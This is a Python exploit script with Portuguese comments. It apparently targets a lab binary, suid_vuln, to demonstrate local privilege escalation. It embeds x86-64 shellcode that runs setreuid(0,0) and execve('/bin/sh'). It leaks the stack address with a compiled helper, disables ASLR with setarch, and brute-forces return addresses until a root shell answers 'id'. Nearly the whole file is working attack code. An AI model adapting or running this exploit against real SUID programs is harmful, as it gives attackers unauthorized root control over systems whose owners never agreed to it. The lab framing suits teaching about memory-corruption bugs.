"""
Exploit para demonstrar Escalonamento de Privilégios
Alvo: suid_vuln (quando configurado com chmod u+s)

Este script tenta explorar um binário SUID vulnerável a buffer overflow.
Ele utiliza um shellcode que executa setreuid(0,0) seguido de execve("/bin/sh").
Inclui uma etapa de calibração para detectar o endereço da stack e varre uma faixa de memória.
"""

import sys, struct, subprocess, time, os

def exploit(binary, target_addr, verbose=True):
    sc =  b"\x48\x31\xc0\x48\x89\xc7\x48\x89\xc6\xb0\x71\x0f\x05"
    sc += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

    nops = b"\x90" * 32
    
    payload = nops + sc
    padding_len = 72 - len(payload)
    
    if padding_len < 0:
        if verbose: print("erro: shellcode muito grande")
        return False

    payload += b"A" * padding_len
    payload += struct.pack("<Q", target_addr)[:6]

    if verbose: print(f"tentando endereço {hex(target_addr)}...")
    
    cmd = ["setarch", "x86_64", "-R", binary, payload]
    
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        p.stdin.write(b"id\n")
        p.stdin.write(b"whoami\n")
        p.stdin.flush()
        
        out, err = p.communicate(timeout=0.5)
        
        if b"uid=0(root)" in out:
            print(f"\nSUCESSO NO ENDEREÇO {hex(target_addr)}!")
            print(out.decode())
            return True
        elif b"uid=" in out:
            print(f"\nshell obtido (sem root) em {hex(target_addr)}")
            return True
            
    except:
        pass
    
    return False

def get_stack_addr():
    print("calibrando endereço da stack...")
    with open("stack_leak.c", "w") as f:
        f.write("#include <stdio.h>\nint main() { char b; printf(\"%p\\n\", &b); return 0; }")
    
    os.system("gcc stack_leak.c -o stack_leak")
    
    try:
        out = subprocess.check_output(["setarch", "x86_64", "-R", "./stack_leak"]).strip()
        addr = int(out, 16)
        print(f"stack detectada em: {hex(addr)}")
    except:
        addr = 0x7fffffffe450
        print("falha na calibração, usando padrão.")
    
    if os.path.exists("stack_leak.c"): os.remove("stack_leak.c")
    if os.path.exists("stack_leak"): os.remove("stack_leak")
    
    return addr

if __name__ == "__main__":
    if not os.path.exists("./suid_vuln"):
        print("erro: compile primeiro com 'make'")
        sys.exit(1)

    base_addr = get_stack_addr()
    
    print("iniciando ataque cirúrgico...")
    
    start_addr = base_addr - 256
    end_addr   = base_addr + 256
    
    for addr in range(start_addr, end_addr, 8):
        if exploit("./suid_vuln", addr, verbose=False):
            break
    else:
        print("falha: nenhum endereço funcionou na faixa testada.")
